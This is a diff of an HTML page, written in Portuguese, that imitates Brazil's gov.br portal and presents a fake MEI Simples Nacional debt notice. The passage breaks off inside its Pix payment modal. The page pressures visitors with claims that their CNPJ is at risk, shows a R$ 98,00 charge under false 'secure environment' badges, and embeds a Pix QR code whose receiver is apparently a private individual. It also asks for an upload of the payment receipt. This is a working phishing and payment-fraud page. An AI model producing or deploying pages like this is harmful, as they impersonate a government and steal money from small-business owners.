@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
@@ -18,593 +17,591 @@
             -moz-osx-font-smoothing: grayscale;
         }
 
-    body {
-        background-color: #f8fafc;
-        color: #334155;
-    }
+        body {
+            background-color: #f8fafc;
+            color: #334155;
+        }
 
-    a {
-        color: #155BCB;
-        text-decoration: none;
-        transition: color 0.2s ease;
-    }
+        a {
+            color: #155BCB;
+            text-decoration: none;
+            transition: color 0.2s ease;
+        }
 
-    a:hover {
-        color: #0d4094;
-        text-decoration: underline;
-    }
+        a:hover {
+            color: #0d4094;
+            text-decoration: underline;
+        }
 
-    /* Topo e Acessibilidade */
-    .accessibility-bar {
-        background-color: #f1f5f9;
-        padding: 8px 24px;
-        font-size: 12px;
-        display: flex;
-        gap: 20px;
-        color: #64748b;
-    }
+        /* Topo e Acessibilidade */
+        .accessibility-bar {
+            background-color: #f1f5f9;
+            padding: 8px 24px;
+            font-size: 12px;
+            display: flex;
+            gap: 20px;
+            color: #64748b;
+        }
 
-    /* Cabeçalho Principal */
-    .header {
-        background-color: #ffffff;
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        padding: 20px 24px;
-        border-bottom: 2px solid #155BCB;
-        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.02);
-    }
+        /* Cabeçalho Principal */
+        .header {
+            background-color: #ffffff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 24px;
+            border-bottom: 2px solid #155BCB;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.02);
+        }
 
-    .logo-container {
-        display: flex;
-        align-items: center;
-        gap: 15px;
-    }
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
 
-    .gov-logo {
-        font-size: 32px;
-        font-weight: 700; 
-        display: flex;
-        letter-spacing: -1.5px; 
-    }
-    .gov-letra-g { color: #155BCB; }
-    .gov-letra-o { color: #FCCC04; }
-    .gov-letra-v { color: #00A859; }
-    .gov-ponto   { color: #155BCB; }
-    .gov-letra-b { color: #155BCB; }
-    .gov-letra-r { color: #FCCC04; }
+        .gov-logo {
+            font-size: 32px;
+            font-weight: 700; 
+            display: flex;
+            letter-spacing: -1.5px; 
+        }
+        .gov-letra-g { color: #155BCB; }
+        .gov-letra-o { color: #FCCC04; }
+        .gov-letra-v { color: #00A859; }
+        .gov-ponto   { color: #155BCB; }
+        .gov-letra-b { color: #155BCB; }
+        .gov-letra-r { color: #FCCC04; }
 
-    .site-title {
-        font-size: 15px;
-        border-left: 1px solid #e2e8f0;
-        padding-left: 15px;
-        font-weight: 500;
-        color: #64748b;
-    }
+        .site-title {
+            font-size: 15px;
+            border-left: 1px solid #e2e8f0;
+            padding-left: 15px;
+            font-weight: 500;
+            color: #64748b;
+        }
 
-    /* Menu de Navegação Superior */
-    .top-nav {
-        background-color: #ffffff;
-        display: flex;
-        gap: 30px;
-        padding: 15px 24px;
-        border-bottom: 1px solid #f1f5f9;
-        font-weight: 500;
-        font-size: 14px;
-        color: #475569;
-    }
+        /* Menu de Navegação Superior */
+        .top-nav {
+            background-color: #ffffff;
+            display: flex;
+            gap: 30px;
+            padding: 15px 24px;
+            border-bottom: 1px solid #f1f5f9;
+            font-weight: 500;
+            font-size: 14px;
+            color: #475569;
+        }
 
-    /* Layout Principal */
-    .container {
-        display: flex;
-        max-width: 1200px;
-        margin: 40px auto;
-        padding: 0 20px;
-        gap: 32px;
-    }
+        /* Layout Principal */
+        .container {
+            display: flex;
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 0 20px;
+            gap: 32px;
+        }
 
-    /* Menu Lateral Esquerdo */
-    .sidebar {
-        width: 250px;
-        background-color: #ffffff;
-        border: 1px solid #e2e8f0;
-        border-radius: 12px;
-        height: fit-content;
-        flex-shrink: 0;
-        box-shadow: 0 4px 15px rgba(0,0,0,0.015);
-        overflow: hidden;
-    }
-    .sidebar h3 { padding: 18px 20px; background-color: #f8fafc; border-bottom: 1px solid #e2e8f0; font-size: 15px; color: #155BCB; font-weight: 600;}
-    .sidebar ul { list-style: none; }
-    .sidebar li { padding: 15px 20px; border-bottom: 1px solid #f1f5f9; font-size: 13px; color: #64748b; transition: all 0.2s; font-weight: 400;}
-    .sidebar li:hover { background-color: #f8fafc; color: #155BCB; cursor: pointer; padding-left: 24px; }
-    .sidebar li.active { border-left: 3px solid #155BCB; background-color: #eff6ff; font-weight: 500; color: #155BCB; }
+        /* Menu Lateral Esquerdo */
+        .sidebar {
+            width: 250px;
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            height: fit-content;
+            flex-shrink: 0;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.015);
+            overflow: hidden;
+        }
+        .sidebar h3 { padding: 18px 20px; background-color: #f8fafc; border-bottom: 1px solid #e2e8f0; font-size: 15px; color: #155BCB; font-weight: 600;}
+        .sidebar ul { list-style: none; }
+        .sidebar li { padding: 15px 20px; border-bottom: 1px solid #f1f5f9; font-size: 13px; color: #64748b; transition: all 0.2s; font-weight: 400;}
+        .sidebar li:hover { background-color: #f8fafc; color: #155BCB; cursor: pointer; padding-left: 24px; }
+        .sidebar li.active { border-left: 3px solid #155BCB; background-color: #eff6ff; font-weight: 500; color: #155BCB; }
 
-    /* Conteúdo Central */
-    .main-content {
-        flex: 1;
-        min-width: 0;
-    }
-    .main-content h1 { font-size: 26px; font-weight: 700; color: #1e293b; margin-bottom: 10px; letter-spacing: -0.5px;}
-    .main-content > p { font-size: 15px; color: #64748b; margin-bottom: 35px; font-weight: 300;}
+        /* Conteúdo Central */
+        .main-content {
+            flex: 1;
+            min-width: 0;
+        }
+        .main-content h1 { font-size: 26px; font-weight: 700; color: #1e293b; margin-bottom: 10px; letter-spacing: -0.5px;}
+        .main-content > p { font-size: 15px; color: #64748b; margin-bottom: 35px; font-weight: 300;}
 
-    /* Barra de Status (Etapas) - Atualizada para destacar a Etapa 2 */
-    .status-tracker {
-        display: flex;
-        border-radius: 10px;
-        overflow: hidden;
-        margin-bottom: 30px;
-        background-color: #ffffff;
-        box-shadow: 0 4px 12px rgba(0,0,0,0.03);
-        border: 1px solid #e2e8f0;
-    }
-    .status-step {
-        flex: 1;
-        padding: 16px;
-        text-align: center;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        border-right: 1px solid #e2e8f0;
-        transition: all 0.3s ease;
-    }
-    .status-step:last-child {
-        border-right: none;
-    }
-    .step-label {
-        font-size: 12px;
-        font-weight: 700;
-        margin-bottom: 4px;
-        text-transform: uppercase;
-        letter-spacing: 0.5px;
-    }
-    .step-title {
-        font-size: 15px;
-        font-weight: 600;
-    }
-    
-    /* Etapa 1 - Concluída */
-    .status-step.completed {
-        background-color: #f0fdf4; 
-        color: #15803d; 
-        border-bottom: 3px solid #f0fdf4; /* Borda invisível para manter alinhamento */
-    }
-    
-    /* Etapa 2 - Marcada / Ativa */
-    .status-step.current {
-        background-color: #eff6ff; 
-        color: #1d4ed8; 
-        border-bottom: 3px solid #2563eb; /* Destaque forte na parte inferior */
-    }
+        /* Barra de Status (Etapas) - Atualizada para destacar a Etapa 2 */
+        .status-tracker {
+            display: flex;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 30px;
+            background-color: #ffffff;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+            border: 1px solid #e2e8f0;
+        }
+        .status-step {
+            flex: 1;
+            padding: 16px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            border-right: 1px solid #e2e8f0;
+            transition: all 0.3s ease;
+        }
+        .status-step:last-child {
+            border-right: none;
+        }
+        .step-label {
+            font-size: 12px;
+            font-weight: 700;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .step-title {
+            font-size: 15px;
+            font-weight: 600;
+        }
+        
+        /* Etapa 1 - Concluída */
+        .status-step.completed {
+            background-color: #f0fdf4; 
+            color: #15803d; 
+            border-bottom: 3px solid #f0fdf4; /* Borda invisível para manter alinhamento */
+        }
+        
+        /* Etapa 2 - Marcada / Ativa */
+        .status-step.current {
+            background-color: #eff6ff; 
+            color: #1d4ed8; 
+            border-bottom: 3px solid #2563eb; /* Destaque forte na parte inferior */
+        }
 
-    .card {
-        background-color: #ffffff;
-        border: 1px solid #e2e8f0;
-        border-radius: 12px;
-        padding: 24px;
-        margin-bottom: 20px;
-        display: flex;
-        gap: 20px;
-        align-items: flex-start;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.015);
-    }
-    .card h3 { margin-bottom: 8px; font-size: 16px; color: #334155; font-weight: 600;}
-    .card p { font-size: 14px; line-height: 1.6; color: #64748b; font-weight: 300;}
+        .card {
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 20px;
+            align-items: flex-start;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.015);
+        }
+        .card h3 { margin-bottom: 8px; font-size: 16px; color: #334155; font-weight: 600;}
+        .card p { font-size: 14px; line-height: 1.6; color: #64748b; font-weight: 300;}
 
-    .card.warning { border-left: 4px solid #f59e0b; background-color: #fffbeb; border-color: #fef3c7;}
-    .card-icon { font-size: 24px; background-color: #ffffff; padding: 12px; border-radius: 50%; border: 1px solid #fef3c7; color: #f59e0b; flex-shrink: 0; box-shadow: 0 4px 10px rgba(245, 158, 11, 0.05);}
+        .card.warning { border-left: 4px solid #f59e0b; background-color: #fffbeb; border-color: #fef3c7;}
+        .card-icon { font-size: 24px; background-color: #ffffff; padding: 12px; border-radius: 50%; border: 1px solid #fef3c7; color: #f59e0b; flex-shrink: 0; box-shadow: 0 4px 10px rgba(245, 158, 11, 0.05);}
 
-    /* Painel Direito - Recibo */
-    .payment-panel {
-        width: 350px;
-        background-color: #ffffff;
-        border: 1px solid #e2e8f0;
-        border-radius: 16px;
-        height: fit-content;
-        display: flex;
-        flex-direction: column;
-        flex-shrink: 0;
-        box-shadow: 0 15px 35px rgba(0,0,0,0.03);
-        position: sticky;
-        top: 24px;
-        overflow: hidden;
-    }
-    .payment-header { padding: 20px; text-align: center; border-bottom: 1px solid #f1f5f9; background-color: #ffffff; }
-    .payment-header h3 { font-size: 16px; color: #1e293b; margin-bottom: 6px; font-weight: 600;}
-    .payment-header small { color: #10b981; font-weight: 500; font-size: 11px; display: flex; justify-content: center; align-items: center; gap: 6px; background: #ecfdf5; padding: 4px 12px; border-radius: 20px; width: fit-content; margin: 0 auto;}
-    
-    .payment-body { padding: 24px; flex-grow: 1; }
-    
-    .value-box {
-        background-color: #f8fafc;
-        border: 1px dashed #cbd5e1;
-        border-radius: 12px;
-        padding: 20px;
-        text-align: center;
-        margin-bottom: 28px;
-    }
-    .value-label { font-size: 11px; font-weight: 600; text-transform: uppercase; margin-bottom: 8px; color: #64748b; letter-spacing: 1px;}
-    .value-amount { font-size: 32px; font-weight: 700; color: #155BCB; letter-spacing: -1px;}
+        /* Painel Direito - Recibo */
+        .payment-panel {
+            width: 350px;
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 16px;
+            height: fit-content;
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.03);
+            position: sticky;
+            top: 24px;
+            overflow: hidden;
+        }
+        .payment-header { padding: 20px; text-align: center; border-bottom: 1px solid #f1f5f9; background-color: #ffffff; }
+        .payment-header h3 { font-size: 16px; color: #1e293b; margin-bottom: 6px; font-weight: 600;}
+        .payment-header small { color: #10b981; font-weight: 500; font-size: 11px; display: flex; justify-content: center; align-items: center; gap: 6px; background: #ecfdf5; padding: 4px 12px; border-radius: 20px; width: fit-content; margin: 0 auto;}
+        
+        .payment-body { padding: 24px; flex-grow: 1; }
+        
+        .value-box {
+            background-color: #f8fafc;
+            border: 1px dashed #cbd5e1;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .value-label { font-size: 11px; font-weight: 600; text-transform: uppercase; margin-bottom: 8px; color: #64748b; letter-spacing: 1px;}
+        .value-amount { font-size: 32px; font-weight: 700; color: #155BCB; letter-spacing: -1px;}
 
-    h4.como-pagar-title { font-size: 13px; color: #475569; margin-bottom: 16px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px;}
+        h4.como-pagar-title { font-size: 13px; color: #475569; margin-bottom: 16px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px;}
 
-    .step-list { list-style: none; padding-left: 0; }
-    .step-item { display: flex; gap: 14px; margin-bottom: 18px; align-items: flex-start; }
-    .step-number { background-color: #eff6ff; color: #155BCB; border-radius: 50%; width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; font-weight: 600; font-size: 12px; flex-shrink: 0; border: 1px solid #bfdbfe;}
-    .step-text { font-size: 13px; line-height: 1.5; color: #64748b; margin-top: 3px; font-weight: 400;}
+        .step-list { list-style: none; padding-left: 0; }
+        .step-item { display: flex; gap: 14px; margin-bottom: 18px; align-items: flex-start; }
+        .step-number { background-color: #eff6ff; color: #155BCB; border-radius: 50%; width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; font-weight: 600; font-size: 12px; flex-shrink: 0; border: 1px solid #bfdbfe;}
+        .step-text { font-size: 13px; line-height: 1.5; color: #64748b; margin-top: 3px; font-weight: 400;}
 
-    .payment-footer { padding: 24px; border-top: 1px solid #f1f5f9; background-color: #ffffff; }
-    
-    .btn-pagar {
-        display: block; width: 100%; padding: 16px; background-color: #10b981; color: white; text-align: center; font-size: 15px; font-weight: 600; border-radius: 10px; border: none; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 15px rgba(16, 185, 129, 0.2); letter-spacing: 0.5px;
-    }
-    .btn-pagar:hover { background-color: #059669; transform: translateY(-1px); box-shadow: 0 6px 20px rgba(16, 185, 129, 0.3);}
-    .btn-pagar:active { transform: translateY(1px); }
-    
-    .btn-azul { background-color: #155BCB; box-shadow: 0 4px 15px rgba(21, 91, 203, 0.2);}
-    .btn-azul:hover { background-color: #0f449e; box-shadow: 0 6px 20px rgba(21, 91, 203, 0.3);}
-    .btn-outline { background-color: transparent; border: 1px solid #e2e8f0; color: #64748b; box-shadow: none; margin-top: 12px;}
-    .btn-outline:hover { background-color: #f8fafc; box-shadow: none; transform: none; color: #334155;}
+        .payment-footer { padding: 24px; border-top: 1px solid #f1f5f9; background-color: #ffffff; }
+        
+        .btn-pagar {
+            display: block; width: 100%; padding: 16px; background-color: #10b981; color: white; text-align: center; font-size: 15px; font-weight: 600; border-radius: 10px; border: none; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 15px rgba(16, 185, 129, 0.2); letter-spacing: 0.5px;
+        }
+        .btn-pagar:hover { background-color: #059669; transform: translateY(-1px); box-shadow: 0 6px 20px rgba(16, 185, 129, 0.3);}
+        .btn-pagar:active { transform: translateY(1px); }
+        
+        .btn-azul { background-color: #155BCB; box-shadow: 0 4px 15px rgba(21, 91, 203, 0.2);}
+        .btn-azul:hover { background-color: #0f449e; box-shadow: 0 6px 20px rgba(21, 91, 203, 0.3);}
+        .btn-outline { background-color: transparent; border: 1px solid #e2e8f0; color: #64748b; box-shadow: none; margin-top: 12px;}
+        .btn-outline:hover { background-color: #f8fafc; box-shadow: none; transform: none; color: #334155;}
 
-    /* Caixinhas de Confiança (Trust Badges) - Design Delicado */
-    .trust-badges {
-        display: flex;
-        gap: 12px;
-        margin-top: 24px;
-        justify-content: space-between;
-    }
-    .trust-badge-item {
-        flex: 1;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: flex-start;
-        text-align: center;
-        background-color: #f8fafc;
-        border: 1px solid #f1f5f9;
-        border-radius: 12px;
-        padding: 16px 8px;
-        transition: transform 0.2s ease;
-    }
-    .trust-badge-item:hover {
-        transform: translateY(-2px);
-    }
-    .trust-badge-icon {
-        font-size: 18px;
-        margin-bottom: 10px;
-        background: #ffffff;
-        width: 36px;
-        height: 36px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        border-radius: 50%;
-        box-shadow: 0 2px 8px rgba(0,0,0,0.03);
-    }
-    .trust-badge-text {
-        font-size: 11px;
-        font-weight: 500;
-        color: #64748b;
-        line-height: 1.3;
-    }
+        /* Caixinhas de Confiança (Trust Badges) - Design Delicado */
+        .trust-badges {
+            display: flex;
+            gap: 12px;
+            margin-top: 24px;
+            justify-content: space-between;
+        }
+        .trust-badge-item {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            text-align: center;
+            background-color: #f8fafc;
+            border: 1px solid #f1f5f9;
+            border-radius: 12px;
+            padding: 16px 8px;
+            transition: transform 0.2s ease;
+        }
+        .trust-badge-item:hover {
+            transform: translateY(-2px);
+        }
+        .trust-badge-icon {
+            font-size: 18px;
+            margin-bottom: 10px;
+            background: #ffffff;
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+        }
+        .trust-badge-text {
+            font-size: 11px;
+            font-weight: 500;
+            color: #64748b;
+            line-height: 1.3;
+        }
 
-    /* MODAL PREMIUM E DELICADO */
-    .modal-overlay {
-        display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(15, 23, 42, 0.4); backdrop-filter: blur(5px); z-index: 1000; justify-content: center; align-items: center; padding: 20px; transition: opacity 0.3s ease;
-    }
-    .modal-content {
-        background-color: #ffffff; width: 100%; max-width: 400px; border-radius: 20px; padding: 40px 32px; box-shadow: 0 25px 50px rgba(0,0,0,0.1); position: relative; text-align: center; animation: modalPop 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-    }
-    
-    @keyframes modalPop {
-        0% { transform: scale(0.95); opacity: 0; }
-        100% { transform: scale(1); opacity: 1; }
-    }
+        /* MODAL PREMIUM E DELICADO */
+        .modal-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(15, 23, 42, 0.4); backdrop-filter: blur(5px); z-index: 1000; justify-content: center; align-items: center; padding: 20px; transition: opacity 0.3s ease;
+        }
+        .modal-content {
+            background-color: #ffffff; width: 100%; max-width: 400px; border-radius: 20px; padding: 40px 32px; box-shadow: 0 25px 50px rgba(0,0,0,0.1); position: relative; text-align: center; animation: modalPop 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        
+        @keyframes modalPop {
+            0% { transform: scale(0.95); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
 
-    .close-modal {
-        position: absolute; top: 16px; right: 24px; font-size: 26px; font-weight: 300; color: #cbd5e1; cursor: pointer; transition: color 0.2s; line-height: 1;
-    }
-    .close-modal:hover { color: #64748b; }
+        .close-modal {
+            position: absolute; top: 16px; right: 24px; font-size: 26px; font-weight: 300; color: #cbd5e1; cursor: pointer; transition: color 0.2s; line-height: 1;
+        }
+        .close-modal:hover { color: #64748b; }
 
-    .modal-content h3 { color: #1e293b; margin-bottom: 12px; font-size: 20px; font-weight: 600; }
-    .modal-content p { font-size: 14px; color: #64748b; margin-bottom: 24px; line-height: 1.5; font-weight: 300;}
+        .modal-content h3 { color: #1e293b; margin-bottom: 12px; font-size: 20px; font-weight: 600; }
+        .modal-content p { font-size: 14px; color: #64748b; margin-bottom: 24px; line-height: 1.5; font-weight: 300;}
 
-    /* Imagem QR Code */
-    .qr-code-wrapper {
-        background: #ffffff; padding: 12px; border-radius: 16px; border: 1px solid #f1f5f9; display: inline-block; margin-bottom: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.03);
-    }
-    .qr-code-wrapper img { display: block; border-radius: 10px; }
+        /* Imagem QR Code */
+        .qr-code-wrapper {
+            background: #ffffff; padding: 12px; border-radius: 16px; border: 1px solid #f1f5f9; display: inline-block; margin-bottom: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.03);
+        }
+        .qr-code-wrapper img { display: block; border-radius: 10px; }
 
-    /* Pix Copia e Cola Moderno */
-    .pix-label { font-size: 12px; font-weight: 500; color: #64748b; margin-bottom: 8px; text-align: left; display: block;}
-    .copy-paste-box {
-        display: flex; align-items: center; background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 6px; margin-bottom: 28px; transition: border 0.2s;
-    }
-    .copy-paste-box:focus-within { border-color: #155BCB; background-color: #ffffff;}
-    .copy-paste-text {
-        flex: 1; font-size: 13px; color: #475569; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; padding: 8px 10px; border: none; background: transparent; outline: none; font-family: monospace;
-    }
-    .btn-copiar {
-        background-color: #eff6ff; color: #155BCB; border: none; padding: 10px 16px; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 12px; transition: all 0.2s;
-    }
-    .btn-copiar:hover { background-color: #dbeafe; }
-    
-    .btn-copiar.sucesso { background-color: #10b981; color: white; }
+        /* Pix Copia e Cola Moderno */
+        .pix-label { font-size: 12px; font-weight: 500; color: #64748b; margin-bottom: 8px; text-align: left; display: block;}
+        .copy-paste-box {
+            display: flex; align-items: center; background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 6px; margin-bottom: 28px; transition: border 0.2s;
+        }
+        .copy-paste-box:focus-within { border-color: #155BCB; background-color: #ffffff;}
+        .copy-paste-text {
+            flex: 1; font-size: 13px; color: #475569; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; padding: 8px 10px; border: none; background: transparent; outline: none; font-family: monospace;
+        }
+        .btn-copiar {
+            background-color: #eff6ff; color: #155BCB; border: none; padding: 10px 16px; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 12px; transition: all 0.2s;
+        }
+        .btn-copiar:hover { background-color: #dbeafe; }
+        
+        .btn-copiar.sucesso { background-color: #10b981; color: white; }
 
-    /* Input de Arquivo Customizado */
-    .file-upload-wrapper {
-        position: relative;
-        margin-bottom: 28px;
-        text-align: left;
-    }
-    .file-upload-wrapper input[type="file"] {
-        display: block; width: 100%; padding: 14px 16px; border: 1px dashed #cbd5e1; border-radius: 10px; background: #f8fafc; color: #64748b; font-size: 13px; cursor: pointer; transition: all 0.2s ease; outline: none;
-    }
-    .file-upload-wrapper input[type="file"]:hover, .file-upload-wrapper input[type="file"]:focus {
-        border-color: #155BCB; background: #eff6ff;
-    }
+        /* Input de Arquivo Customizado */
+        .file-upload-wrapper {
+            position: relative;
+            margin-bottom: 28px;
+            text-align: left;
+        }
+        .file-upload-wrapper input[type="file"] {
+            display: block; width: 100%; padding: 14px 16px; border: 1px dashed #cbd5e1; border-radius: 10px; background: #f8fafc; color: #64748b; font-size: 13px; cursor: pointer; transition: all 0.2s ease; outline: none;
+        }
+        .file-upload-wrapper input[type="file"]:hover, .file-upload-wrapper input[type="file"]:focus {
+            border-color: #155BCB; background: #eff6ff;
+        }
 
-    /* Check Animado Sucesso */
-    .success-icon-wrapper {
-        width: 70px; height: 70px; background-color: #ecfdf5; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px auto; color: #10b981; font-size: 32px;
-    }
+        /* Check Animado Sucesso */
+        .success-icon-wrapper {
+            width: 70px; height: 70px; background-color: #ecfdf5; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px auto; color: #10b981; font-size: 32px;
+        }
 
-    @media (max-width: 992px) {
-        .container { flex-direction: column; }
-        .sidebar { width: 100%; }
-        .payment-panel { width: 100%; position: static;}
-        .trust-badges { flex-wrap: wrap; }
-        .trust-badge-item { flex: 1 1 calc(33% - 10px); min-width: 90px;}
-        .status-tracker { flex-direction: column; }
-        .status-step { border-right: none; border-bottom: 1px solid #e2e8f0; }
-        .status-step:last-child { border-bottom: none; }
-    }
-</style>
-
+        @media (max-width: 992px) {
+            .container { flex-direction: column; }
+            .sidebar { width: 100%; }
+            .payment-panel { width: 100%; position: static;}
+            .trust-badges { flex-wrap: wrap; }
+            .trust-badge-item { flex: 1 1 calc(33% - 10px); min-width: 90px;}
+            .status-tracker { flex-direction: column; }
+            .status-step { border-right: none; border-bottom: 1px solid #e2e8f0; }
+            .status-step:last-child { border-bottom: none; }
+        }
+    </style>
 </head>
 <body>
 
-<div class="accessibility-bar">
-    <a href="#">Ir para o conteúdo</a>
-</div>
-
-<header class="header">
-    <div class="logo-container">
-        <div class="gov-logo">
-            <span class="gov-letra-g">g</span><span class="gov-letra-o">o</span><span class="gov-letra-v">v</span><span class="gov-ponto">.</span><span class="gov-letra-b">b</span><span class="gov-letra-r">r</span>
-        </div>
-        <div class="site-title">Serviços e Informações do Brasil</div>
+    <div class="accessibility-bar">
+        <a href="#">Ir para o conteúdo</a>
     </div>
-</header>
 
-<nav class="top-nav">
-    <a href="#">Órgãos do Governo</a>
-    <a href="#">Acesso à Informação</a>
-</nav>
-
-<div class="container">
-    <aside class="sidebar">
-        <h3>Empreendedor</h3>
-        <ul>
-            <li>Abertura de Empresas</li>
-            <li>MEI - Microempreendedor</li>
-            <li class="active">Simples Nacional</li>
-        </ul>
-    </aside>
-
-    <main class="main-content">
-        <!-- Status Tracker Destacando a Etapa 2 Ativa -->
-        <div class="status-tracker">
-            <div class="status-step completed">
-                <span class="step-label">✔ Etapa 1</span>
-                <span class="step-title">Registro gerado</span>
+    <header class="header">
+        <div class="logo-container">
+            <div class="gov-logo">
+                <span class="gov-letra-g">g</span><span class="gov-letra-o">o</span><span class="gov-letra-v">v</span><span class="gov-ponto">.</span><span class="gov-letra-b">b</span><span class="gov-letra-r">r</span>
             </div>
-            <div class="status-step current">
-                <span class="step-label">Etapa 2</span>
-                <span class="step-title">Aguardando quitação</span>
-            </div>
+            <div class="site-title">Serviços e Informações do Brasil</div>
         </div>
+    </header>
 
-        <h1>Pagamento Simples Nacional - MEI</h1>
-        <p>Regularize os débitos do Microempreendedor Individual</p>
+    <nav class="top-nav">
+        <a href="#">Órgãos do Governo</a>
+        <a href="#">Acesso à Informação</a>
+    </nav>
 
-        <div class="card">
-            <div>
-                <h3>DAS-MEI - Documento de Arrecadação</h3>
-                <p>Emita e pague o Documento de Arrecadação do Simples Nacional para Microempreendedor Individual através do sistema unificado.</p>
-            </div>
-        </div>
-
-        <div class="card warning">
-            <div class="card-icon">⚠️</div>
-            <div>
-                <h3>Aviso de Pendência</h3>
-                <p>Identificamos débitos em seu cadastro MEI. A regularização imediata é necessária para manter o seu CNPJ ativo e continuar utilizando os serviços digitais do Governo Federal sem restrições.</p>
-            </div>
-        </div>
-    </main>
-
-    <aside class="payment-panel">
-        <div class="payment-header">
-            <h3>Recolhimento MEI</h3>
-            <small>🔒 Ambiente Seguro • SSL 256-bit</small>
-        </div>
-        
-        <div class="payment-body">
-            <div class="value-box">
-                <div class="value-label">Total a Pagar</div>
-                <div class="value-amount">R$ 98,00</div>
-            </div>
-            
-            <h4 class="como-pagar-title">Como pagar</h4>
-            <ul class="step-list">
-                <li class="step-item"><div class="step-number">1</div><div class="step-text">Clique no botão "EFETUAR PAGAMENTO".</div></li>
-                <li class="step-item"><div class="step-number">2</div><div class="step-text">Escaneie o QR Code ou utilize o Pix Copia e Cola no app do seu banco.</div></li>
-                <li class="step-item"><div class="step-number">3</div><div class="step-text">Anexe o comprovante para validar o processo.</div></li>
+    <div class="container">
+        <aside class="sidebar">
+            <h3>Empreendedor</h3>
+            <ul>
+                <li>Abertura de Empresas</li>
+                <li>MEI - Microempreendedor</li>
+                <li class="active">Simples Nacional</li>
             </ul>
-        </div>
-        
-        <div class="payment-footer">
-            <button class="btn-pagar" id="btn-abrir-modal">EFETUAR PAGAMENTO</button>
-            
-            <!-- Caixinhas de Benefícios Delicadas (Trust Badges) -->
-            <div class="trust-badges">
-                <div class="trust-badge-item">
-                    <div class="trust-badge-icon">🔒</div>
-                    <div class="trust-badge-text">Pagamento seguro</div>
+        </aside>
+
+        <main class="main-content">
+            <!-- Status Tracker Destacando a Etapa 2 Ativa -->
+            <div class="status-tracker">
+                <div class="status-step completed">
+                    <span class="step-label">✔ Etapa 1</span>
+                    <span class="step-title">Registro gerado</span>
                 </div>
-                <div class="trust-badge-item">
-                    <div class="trust-badge-icon">⏱️</div>
-                    <div class="trust-badge-text">Regularização na mesma hora</div>
-                </div>
-                <div class="trust-badge-item">
-                    <div class="trust-badge-icon">⚡</div>
-                    <div class="trust-badge-text">Pix instantâneo</div>
+                <div class="status-step current">
+                    <span class="step-label">Etapa 2</span>
+                    <span class="step-title">Aguardando quitação</span>
                 </div>
             </div>
 
-        </div>
-    </aside>
-</div>
+            <h1>Pagamento Simples Nacional - MEI</h1>
+            <p>Regularize os débitos do Microempreendedor Individual</p>
 
-<!-- MODAL SOBREPOSTO (CENTRO DA TELA) -->
-<div class="modal-overlay" id="payment-modal">
-    <div class="modal-content">
-        <span class="close-modal" id="fechar-modal" title="Fechar">&times;</span>
-
-        <!-- Tela 1: QR CODE e COPIA E COLA -->
-        <div id="modal-step-1">
-            <h3>Pagamento via Pix</h3>
-            <p>Abra o app do seu banco e aponte a câmera para o código abaixo ou utilize o código Copia e Cola.</p>
-            
-            <div class="qr-code-wrapper">
-                <img src="https://api.qrserver.com/v1/create-qr-code/?data=00020126360014br.gov.bcb.pix011466707517000123520400005303986540598.005802BR592566.707.517%20Leonardo%20Sebas6014RIO%20DE%20JANEIRO62070503***630479DE&size=200x200" alt="QR Code PIX">
-            </div>
-            
-            <label class="pix-label">Código Pix Copia e Cola:</label>
-            <div class="copy-paste-box">
